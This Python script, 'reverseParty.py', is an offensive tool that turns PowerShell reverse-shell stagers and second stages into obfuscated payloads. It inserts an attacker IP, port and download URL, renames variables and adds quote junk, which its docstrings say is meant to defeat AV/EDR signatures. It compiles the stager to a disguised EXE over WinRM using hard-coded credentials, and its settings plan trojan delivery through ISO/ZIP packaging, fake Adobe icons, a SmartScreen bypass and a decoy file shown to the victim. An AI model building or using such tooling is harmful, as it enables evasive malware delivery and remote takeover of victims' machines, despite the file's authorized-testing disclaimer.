#!/usr/bin/env python3
"""
reverseParty.py - Reverse Shell Generation and Obfuscation Tool
================================================================
This script automates the creation of obfuscated reverse shells and stagers
for authorized penetration testing and red team operations.

DISCLAIMER: This tool is intended for authorized security testing only.
Unauthorized use against systems you do not own or have explicit permission
to test is illegal and unethical.

Directory structure expected:
  reverseParty/
  ├── reverseParty.py         (this script)
  └── engine/
      ├── powershell-cmd/
      │   ├── powershell-cmd.txt              (all PowerShell commands)
      │   └── powershell-cmd-noParametri.txt  (PS commands without params)
      ├── second-stage/        (clear-text reverse shell files)
      ├── stager/              (clear-text stager files)
      ├── out/                 (output - gets cleared each run)
      ├── stuff/               (support files: LAUNCHERNAME etc.)
      └── listener/            (listener scripts)

Dependencies:
    pip install pywinrm
"""

import os
import sys
import re
import uuid
import random
import shutil
import base64

# Optional WinRM dependency - imported lazily in step 4
try:
    import winrm
    WINRM_AVAILABLE = True
except ImportError:
    WINRM_AVAILABLE = False


# ==============================================================================
# VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
# ==============================================================================

# LHOST - Public IP address to receive the reverse shell callback
# Example: "192.168.1.11"  or  "10.0.0.1"  or  "203.0.113.42"
LHOST = "151.61.206.201"

# LPORT - Port number to listen on for incoming reverse shell connections
# Example: "9001"  or  "4444"  or  "443"
LPORT = "9001"

# ATTACKER_URL - Base URL from which second-stage, backdoor zip and ISO
# will be downloaded by the victim machine
# Example: "http://192.168.1.11"  or  "http://myDomain.com/stuff"
ATTACKER_URL = "http://151.61.206.201"

# SECONDNAME - Filename for the second-stage payload on the attacker server
# Example: "second.txt"  or  "update.dat"
SECONDNAME = "second.txt"

# STAGERNAME - Filename for the stager script on the attacker server
# Example: "stager.txt"  or  "init.dat"
STAGERNAME = "stager.txt"

# LAUNCHERNAME - Trusted Windows binary / launcher file used to bypass SmartScreen
# Example: "launcher.bat"  or  "setup.bat"
LAUNCHERNAME = "launcher.bat"

# EXENAME - Name of the stager/trojan compiled as an executable (run by LAUNCHERNAME)
# Example: "ps2pdf.exe"  or  "adobeupdate.exe"
EXENAME = "ps2pdf.exe"

# ZIPNAME - Name of the ZIP archive containing launcher + stager EXE
# Example: "postscript.zip"  or  "adobeCC.zip"
ZIPNAME = "postscript.zip"

# ISONAME - Name of the ISO image containing the launcher and trojan zip
# Example: "setup.iso"  or  "AdobeCC_2024.iso"
ISONAME = "setup.iso"

# WIN_IP - IP address of the Windows machine used to compile PS1 scripts to EXE
# Example: "192.168.1.10"
WIN_IP = "192.168.1.111"

# WIN_USER - Username to authenticate to the Windows machine
# Example: "administrator"  or  "user"
WIN_USER = "ieuser"

# WIN_PASS - Password to authenticate to the Windows machine
# Example: "MyP@ssw0rd"
WIN_PASS = "Passw0rd!"

# TROJAN_FE - Decoy front-end file displayed to victim after the backdoor installs
# Example: "update_k897867.msu"  or  "image.jpg"
TROJAN_FE = "update_k897867.msu"

# ICONNAME - ICO file used to make the trojan EXE look convincing
# Example: "adobe.ico"  or  "windows_update.ico"
ICONNAME = "adobe.ico"

# TROJANNAME - PS1 script defining trojan behavior (downloads backdoor + launches TROJAN_FE)
# Example: "installer.ps1"  or  "update.ps1"
TROJANNAME = "installer.ps1"

# TROJAN_URL - URL from which to download the trojan PS1 script
# Example: "https://raw.githubusercontent.com/user/repo/main/privateFolder"
TROJAN_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"

# ==============================================================================
# END OF USER-CONFIGURABLE VARIABLES
# ==============================================================================


# --- ANSI color codes for terminal output ---
RED_DARK = "\033[31m"
YELLOW   = "\033[33m"
GREEN    = "\033[32m"
RESET    = "\033[0m"

# --- Path definitions (relative to the script location) ---
SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
ENGINE_DIR       = os.path.join(SCRIPT_DIR, "engine")
OUT_DIR          = os.path.join(ENGINE_DIR, "out")
SECOND_STAGE_DIR = os.path.join(ENGINE_DIR, "second-stage")
STAGER_DIR       = os.path.join(ENGINE_DIR, "stager")
STUFF_DIR        = os.path.join(ENGINE_DIR, "stuff")
LISTENER_DIR     = os.path.join(ENGINE_DIR, "listener")
PS_CMD_DIR       = os.path.join(ENGINE_DIR, "powershell-cmd")
PS_CMD_FILE      = os.path.join(PS_CMD_DIR, "powershell-cmd.txt")
PS_CMD_NOPARAM   = os.path.join(PS_CMD_DIR, "powershell-cmd-noParametri.txt")


# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def banner():
    print("=" * 70)
    print("  reverseParty.py — Reverse Shell Obfuscation Tool")
    print("  For authorized penetration testing use only.")
    print("=" * 70)
    print()

def section(title: str):
    print()
    print("─" * 70)
    print(f"  {title}")
    print("─" * 70)

def info(msg: str):
    print(f"  [*] {msg}")

def ok(msg: str):
    print(f"  {GREEN}[+]{RESET} {msg}")

def warn(msg: str):
    print(f"  {YELLOW}[!]{RESET} {msg}")

def err(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")
    sys.exit(1)

def err_nonfatal(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")

def generate_hex_pool(count: int = 80) -> list:
    """
    Generate a pool of unique UUID4 hex strings.
    Used as random replacement names for PowerShell variables.
    Each call to uuid.uuid4().hex produces a 32-char hex string from a
    cryptographically random UUID, guaranteeing high entropy and uniqueness.
    """
    pool = []
    seen = set()
    while len(pool) < count:
        h = uuid.uuid4().hex
        if h not in seen:
            seen.add(h)
            pool.append(h)
    return pool

def read_file(path: str) -> str:
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return f.read()

def write_file(path: str, content: str):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


# ==============================================================================
# OBFUSCATION — PASS 1: Variable renaming
# ==============================================================================

def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
    """
    Obfuscation Pass 1 — Rename user-defined PowerShell variables.

    Scans the content for all variable ASSIGNMENT patterns of the exact form:
        $varname=
    where:
      - The name starts with $ followed immediately by a letter or underscore.
      - The name ends with = (with optional spaces before it).
      - The name contains NO colon — this safely excludes environment variables
        such as $env:PATH, $PSVersionTable, etc.

    Each unique variable found is mapped to one UUID hex token from the pool.
    That token then replaces EVERY occurrence of the variable throughout the
    file — both at the assignment site ($name = ...) and at all usage sites
    ($name).

    Key rules:
      - Only $name= is targeted.  name= and $name alone are NOT touched.
      - Each hex token is used for exactly one variable (no reuse).
      - Replacement is whole-word safe: $myVar won't match inside $myVarLong.

    Example:
        $url = "http://..."   →   $3f8ab2c1...= "http://..."
        IEX $url              →   IEX $3f8ab2c1...

    Args:
        content:  Full PowerShell file text.
        hex_pool: Pre-generated list of unique hex tokens.
        used_hex: Set of already-consumed tokens (modified in-place).

    Returns:
        (obfuscated_content, mapping_dict)
    """
    # Match $varname= — colon excluded from name → env vars are safe
    pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
    var_names = set(pattern.findall(content))

    mapping = {}
    for var_name in sorted(var_names):
        available = [h for h in hex_pool if h not in used_hex]
        if not available:
            for h in generate_hex_pool(80):
                if h not in used_hex:
                    available.append(h)
        chosen = available[0]
        used_hex.add(chosen)
        mapping[var_name] = chosen

    # Replace every occurrence: both assignments ($name =) and usages ($name)
    # The negative lookahead ensures we don't match substrings of longer names
    for var_name, hex_name in mapping.items():
        content = re.sub(
            r'\$' + re.escape(var_name) + r'(?=[^A-Za-z0-9_]|$)',
            '$' + hex_name,
            content
        )

    return content, mapping


# ==============================================================================
# OBFUSCATION — PASS 2: PowerShell command quote injection (Method 1)
# ==============================================================================

def _insert_junk_between_chars(word: str) -> str:
    """
    Method 1 — Insert empty-string pairs between characters of a PS command.

    PowerShell parses  wh''oam''i  identically to  whoami  because the empty
    strings are concatenated at parse time with zero effect on execution.
    This breaks character-sequence-based AV/EDR signatures without altering
    the functional meaning of the command.

    Algorithm:
      1. Choose a random number of insertion points: min=1, max=len(word)-1.
      2. Select that many random gap positions between adjacent characters.
      3. At each selected gap, insert either '' or "" chosen at random.

    Hard constraints enforced:
      - At most ONE separator per gap between two letters.
        → who''''ami is INVALID (two separators in the same gap).
        → wh""''oami is INVALID (two different separators in the same gap).
      - A separator is exactly '' (two single-quotes) OR "" (two double-quotes).
      - At least one separator is always inserted.

    Valid example:   whoami  →  w''ho""am''i
    Invalid example: who''''ami   (double separator in one gap — forbidden)

    Args:
        word: A single PS command token string (e.g. "whoami").

    Returns:
        The token with quote pairs injected between random character pairs.
    """
    if len(word) <= 1:
        return word

    separators = ["''", '""']
    chars = list(word)
    max_insertions = len(chars) - 1
    n_insertions = random.randint(1, max_insertions)

    gap_indices = list(range(max_insertions))
    insert_positions = set(random.sample(gap_indices, n_insertions))

    result = [chars[0]]
    for i in range(len(chars) - 1):
        if i in insert_positions:
            # Insert exactly ONE separator ('' or "") — never two in the same gap
            result.append(random.choice(separators))
        result.append(chars[i + 1])

    return "".join(result)


def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
    """
    Obfuscation Pass 2 — Apply Method 1 to known PowerShell command tokens.

    Reads the command list from ps_cmd_file, then for every command that
    appears as a whole token in the content, applies _insert_junk_between_chars.

    Matching rules:
      - Commands are sorted longest-first before matching.
        This prevents a shorter command (e.g. "ls") from being matched
        inside a longer one (e.g. "cls") that was already processed.
      - Only whole-word token matches are replaced (word-boundary safe regex).
      - Commands whose first character is '.' or ':' are skipped entirely.
      - Matching is case-insensitive (PowerShell is case-insensitive).
      - ONLY the matched token is replaced; all surrounding text is untouched.

    Args:
        content:     Full text of the PowerShell file.
        ps_cmd_file: Path to powershell-cmd.txt.

    Returns:
        Content with PS command tokens obfuscated via Method 1.
    """
    if not os.path.isfile(ps_cmd_file):
        warn(f"PS command list not found: {ps_cmd_file} — skipping pass 2.")
        return content

    raw = read_file(ps_cmd_file).splitlines()
    commands = [c.strip() for c in raw if c.strip()]
    commands.sort(key=len, reverse=True)  # longest first

    for cmd in commands:
        # Skip commands that start with '.' or ':' or '('
        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
            continue

        # Word-boundary pattern: not preceded or followed by identifier chars: . : (
        pattern = re.compile(
            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
            re.IGNORECASE
        )

        def replacer(match):
            # Preserve the original casing of the matched token
            return _insert_junk_between_chars(match.group(0))

        content = pattern.sub(replacer, content)

    return content


# ==============================================================================
# OBFUSCATION PIPELINE — 2 passes only (variable rename + quote injection)
# ==============================================================================

def full_obfuscation_pipeline(content: str, label: str) -> str:
    """
    Run the two safe obfuscation passes on the given PowerShell content.

    Only two passes are applied to guarantee the output remains fully
    functional PowerShell code:

      Pass 1 — Variable renaming:
        Every user-defined variable assignment pattern  $name=  is found.
        Each unique variable name is replaced with a UUID hex token throughout
        the entire file (both assignment and all usage sites).
        Environment variables ($env:X, etc.) are left completely untouched.
        No two variables share the same hex token.

      Pass 2 — PS command quote injection (Method 1):
        Known PowerShell command tokens (from powershell-cmd.txt) are located
        in the content using longest-first, case-insensitive, whole-word
        matching. Each matched token has '' or "" pairs inserted between
        random pairs of adjacent characters — at most one separator per gap.
        Commands starting with '.' or ':' are excluded.
        Only the token itself is modified; all surrounding text is unchanged.

    No other transformations are applied. Passes that modify string literals,
    split cmdlet names, or encode content (Base64 etc.) are intentionally
    excluded as they break PowerShell syntax in practice.

    Args:
        content: Raw PowerShell content (after placeholder substitution).
        label:   Short label for log output (e.g. "second-stage", "stager").

    Returns:
        Obfuscated PowerShell content safe to execute.
    """
    hex_pool = generate_hex_pool(120)
    used_hex = set()

    # ── Pass 1: Variable renaming ────────────────────────────────────────────
    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
    if var_map:
        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
        for orig, new in var_map.items():
            print(f"             ${orig}  →  ${new}")
    else:
        info(f"  [{label}] No assignable user-defined variables found.")

    # ── Pass 2: PS command quote injection (Method 1) ────────────────────────
    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — quote injection)...")
    before = content
    content = obfuscate_ps_commands(content, PS_CMD_FILE)
    if content != before:
        ok(f"  [{label}] PS command tokens obfuscated with '' / \"\" insertions.")
    else:
        info(f"  [{label}] No matching PS command tokens found for quote injection.")

    return content


# ==============================================================================
# STEP 1 — VARIABLE VALIDATION
# ==============================================================================

def step1_validate_variables():
    """
    STEP 1: Validate all required configuration variables.

    Checks that every user-configurable variable defined at the top of the
    script is non-empty. All variable names and current values are printed
    so the operator can visually confirm correctness before proceeding.

    If any variable is blank the script aborts immediately with an error.
    No partial runs are permitted.
    """
    section("STEP 1 — Variable Validation")
    info("Checking that all required configuration variables are set...")
    info("The following values will be used during this run:")
    print()

    variables = {
        "LHOST":        LHOST,
        "LPORT":        LPORT,
        "ATTACKER_URL": ATTACKER_URL,
        "SECONDNAME":   SECONDNAME,
        "STAGERNAME":   STAGERNAME,
        "LAUNCHERNAME": LAUNCHERNAME,
        "EXENAME":      EXENAME,
        "ZIPNAME":      ZIPNAME,
        "ISONAME":      ISONAME,
        "WIN_IP":       WIN_IP,
        "WIN_USER":     WIN_USER,
        "WIN_PASS":     WIN_PASS,
        "TROJAN_FE":    TROJAN_FE,
        "ICONNAME":     ICONNAME,
        "TROJANNAME":   TROJANNAME,
        "TROJAN_URL":   TROJAN_URL,
    }

    all_ok = True
    max_len = max(len(k) for k in variables)

    for var_name, var_value in variables.items():
        padded = var_name.ljust(max_len)
        if not var_value or var_value.strip() == "":
            print(f"    {RED_DARK}{padded} = [NOT SET]  ← MISSING!{RESET}")
            all_ok = False
        else:
            print(f"    {padded} = {var_value}")

    print()
    if not all_ok:
        err("One or more required variables are not set. "
            "Please edit the variables section at the top of the script.")

    ok("All variables are set. Proceeding to Step 2...")


# ==============================================================================
# STEP 2 — SECOND STAGE OBFUSCATION
# ==============================================================================

def step2_obfuscate_second_stage():
    """
    STEP 2: Select, configure, and obfuscate the second-stage reverse shell.

    Actions performed:
      2a. Clear the entire /engine/out/ directory (clean slate for this run).
      2b. Randomly select one file from /engine/second-stage/.
          The selected filename is printed for the operator.
      2c. Copy it to /engine/out/ as SECONDNAME.
      2d. Substitute placeholders in the copied file:
            [ATTACKER-IP]   →  LHOST
            [ATTACKER-PORT] →  LPORT
      2e. Apply the 2-pass obfuscation pipeline:
            Pass 1 — variable renaming with UUID hex tokens
            Pass 2 — PS command quote injection (Method 1)
    """
    section("STEP 2 — Second Stage Obfuscation")

    # 2a. Clear out/
    info("Clearing output directory: " + OUT_DIR)
    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)
    ok("Output directory cleared and recreated successfully.")

    # 2b. Random selection from second-stage/
    info("Scanning second-stage directory: " + SECOND_STAGE_DIR)
    if not os.path.isdir(SECOND_STAGE_DIR):
        err(f"Second-stage directory not found: {SECOND_STAGE_DIR}")

    stage_files = [
        f for f in os.listdir(SECOND_STAGE_DIR)
        if os.path.isfile(os.path.join(SECOND_STAGE_DIR, f))
    ]
    if not stage_files:
        err(f"No files found in second-stage directory: {SECOND_STAGE_DIR}")

    selected = random.choice(stage_files)
    selected_path = os.path.join(SECOND_STAGE_DIR, selected)
    ok(f"Randomly selected second-stage file: {selected}")

    # 2c. Copy to out/ as SECONDNAME
    dest_path = os.path.join(OUT_DIR, SECONDNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    # 2d. Substitute placeholders
    info("Substituting placeholders [ATTACKER-IP] and [ATTACKER-PORT]...")
    content = read_file(dest_path)
    n_ip   = content.count("[ATTACKER-IP]")
    n_port = content.count("[ATTACKER-PORT]")
    content = content.replace("[ATTACKER-IP]",   LHOST)
    content = content.replace("[ATTACKER-PORT]", LPORT)
    write_file(dest_path, content)
    ok(f"Replaced {n_ip} occurrence(s) of [ATTACKER-IP]   → '{LHOST}'.")
    ok(f"Replaced {n_port} occurrence(s) of [ATTACKER-PORT] → '{LPORT}'.")

    # 2e. Obfuscation pipeline (2 passes)
    info("Starting obfuscation pipeline (2 passes) on second-stage file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="second-stage")
    write_file(dest_path, content)
    ok(f"Second-stage obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 3 — STAGER OBFUSCATION
# ==============================================================================

def step3_obfuscate_stager():
    """
    STEP 3: Select, configure, and obfuscate the stager.

    Actions performed:
      3a. Randomly select one file from /engine/stager/.
          The selected filename is printed for the operator.
      3b. Copy it to /engine/out/ as STAGERNAME.
      3c. Substitute placeholders in the copied file:
            [ATTACKER-URL] →  ATTACKER_URL
            [SECONDNAME]   →  SECONDNAME
      3d. Apply the 2-pass obfuscation pipeline:
            Pass 1 — variable renaming with UUID hex tokens
            Pass 2 — PS command quote injection (Method 1)
    """
    section("STEP 3 — Stager Obfuscation")

    # 3a. Random selection from stager/
    info("Scanning stager directory: " + STAGER_DIR)
    if not os.path.isdir(STAGER_DIR):
        err(f"Stager directory not found: {STAGER_DIR}")

    stager_files = [
        f for f in os.listdir(STAGER_DIR)
        if os.path.isfile(os.path.join(STAGER_DIR, f))
    ]
    if not stager_files:
        err(f"No files found in stager directory: {STAGER_DIR}")

    selected = random.choice(stager_files)
    selected_path = os.path.join(STAGER_DIR, selected)
    ok(f"Randomly selected stager file: {selected}")

    # 3b. Copy to out/ as STAGERNAME
    dest_path = os.path.join(OUT_DIR, STAGERNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    # 3c. Substitute placeholders
    info("Substituting placeholders [ATTACKER-URL] and [SECONDNAME]...")
    content = read_file(dest_path)
    n_url = content.count("[ATTACKER-URL]")
    n_sec = content.count("[SECONDNAME]")
    content = content.replace("[ATTACKER-URL]", ATTACKER_URL)
    content = content.replace("[SECONDNAME]",   SECONDNAME)
    write_file(dest_path, content)
    ok(f"Replaced {n_url} occurrence(s) of [ATTACKER-URL] → '{ATTACKER_URL}'.")
    ok(f"Replaced {n_sec} occurrence(s) of [SECONDNAME]   → '{SECONDNAME}'.")

    # 3d. Obfuscation pipeline (2 passes)
    info("Starting obfuscation pipeline (2 passes) on stager file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="stager")
    write_file(dest_path, content)
    ok(f"Stager obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 4 — STAGER PS1 → EXE CONVERSION VIA WINRM
# ==============================================================================

def step4_convert_stager_to_exe():
    """
    STEP 4: Convert the obfuscated stager PS1 to a Windows EXE via WinRM.

    Actions performed:
      4a. Check that pywinrm is installed. If not → dark-red error, skip step.
      4b. Connect to WIN_IP via WinRM (NTLM auth). If unreachable → dark-red
          error, skip step. Script continues regardless.
      4c. Upload STAGERNAME from out/ to %TEMP% on Windows via Base64 transfer.
      4d. Run Invoke-ps2exe STAGERNAME EXENAME on the remote machine.
      4e. Download the resulting EXENAME back to local out/ via Base64 transfer.
      4f. Clean up temporary files from Windows %TEMP%.

    On any failure: print a dark-red message and return — script continues.
    """
    section("STEP 4 — Stager PS1 → EXE Conversion via WinRM")

    stager_local = os.path.join(OUT_DIR, STAGERNAME)
    exe_local    = os.path.join(OUT_DIR, EXENAME)

    # 4a. Check pywinrm
    if not WINRM_AVAILABLE:
        err_nonfatal(
            "The 'pywinrm' library is not installed. "
            "Run: pip install pywinrm\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 4b. Connect via WinRM
    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
    try:
        session = winrm.Session(
            f"http://{WIN_IP}:5985/wsman",
            auth=(WIN_USER, WIN_PASS),
            transport="ntlm",
            read_timeout_sec=30,
            operation_timeout_sec=25,
        )
        result = session.run_ps("$env:COMPUTERNAME")
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        hostname = result.std_out.decode(errors="replace").strip()
        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
    except Exception as e:
        err_nonfatal(
            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 4c. Upload STAGERNAME to Windows %TEMP% via Base64
    info(f"Uploading {STAGERNAME} to Windows %TEMP% directory...")
    try:
        with open(stager_local, "rb") as f:
            file_bytes = f.read()
        b64_content = base64.b64encode(file_bytes).decode("ascii")
        upload_ps = (
            f"$b64 = '{b64_content}';\n"
            f"$bytes = [System.Convert]::FromBase64String($b64);\n"
            f"[System.IO.File]::WriteAllBytes(\"$env:TEMP\\{STAGERNAME}\", $bytes);\n"
            f"Write-Output 'Upload OK'"
        )
        result = session.run_ps(upload_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        ok(f"File {STAGERNAME} uploaded to remote %TEMP% successfully.")
    except Exception as e:
        err_nonfatal(
            f"Failed to upload {STAGERNAME} to {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 4d. Run Invoke-ps2exe on remote machine
    info(f"Running Invoke-ps2exe: {STAGERNAME} → {EXENAME}...")
    try:
        convert_ps = (
            f"Invoke-ps2exe \"$env:TEMP\\{STAGERNAME}\" \"$env:TEMP\\{EXENAME}\";\n"
            f"if (Test-Path \"$env:TEMP\\{EXENAME}\") "
            f"{{ Write-Output 'Conversion OK' }} "
            f"else {{ Write-Error 'EXE not created' }}"
        )
        result = session.run_ps(convert_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{EXENAME}")
    except Exception as e:
        err_nonfatal(
            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
            f"(Install-Module ps2exe).\n"
            f"  The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        session.run_ps(f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0")
        return

    # 4e. Download EXENAME from Windows %TEMP% to local out/
    info(f"Downloading {EXENAME} from Windows %TEMP% to local out/...")
    try:
        download_ps = (
            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{EXENAME}\");\n"
            f"[System.Convert]::ToBase64String($bytes)"
        )
        result = session.run_ps(download_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        b64_exe  = result.std_out.decode(errors="replace").strip()
        exe_bytes = base64.b64decode(b64_exe)
        with open(exe_local, "wb") as f:
            f.write(exe_bytes)
        ok(f"EXE downloaded: {exe_local} ({len(exe_bytes):,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to download {EXENAME} from {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE will NOT be available locally. "
            f"Continuing...{RESET}"
        )

    # 4f. Cleanup remote %TEMP%
    info("Cleaning up temporary files from Windows %TEMP%...")
    try:
        cleanup_ps = (
            f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0;\n"
            f"Remove-Item \"$env:TEMP\\{EXENAME}\" -Force -EA 0;\n"
            f"Write-Output 'Cleanup OK'"
        )
        session.run_ps(cleanup_ps)
        ok("Remote temporary files cleaned up.")
    except Exception:
        warn("Could not clean up temporary files on the Windows machine.")


# ==============================================================================
# MAIN
# ==============================================================================

def main():
    banner()
    step1_validate_variables()
    step2_obfuscate_second_stage()
    step3_obfuscate_stager()
    step4_convert_stager_to_exe()

    section("ALL STEPS COMPLETED")
    ok("reverseParty.py finished successfully.")
    print()
    info(f"Output directory : {OUT_DIR}")
    info(f"Second stage     : {os.path.join(OUT_DIR, SECONDNAME)}")
    info(f"Stager (PS1)     : {os.path.join(OUT_DIR, STAGERNAME)}")
    exe_path = os.path.join(OUT_DIR, EXENAME)
    if os.path.isfile(exe_path):
        info(f"Stager (EXE)     : {exe_path}")
    else:
        warn(f"Stager (EXE)     : not generated (see Step 4 output above)")
    print()


if __name__ == "__main__":
    main()
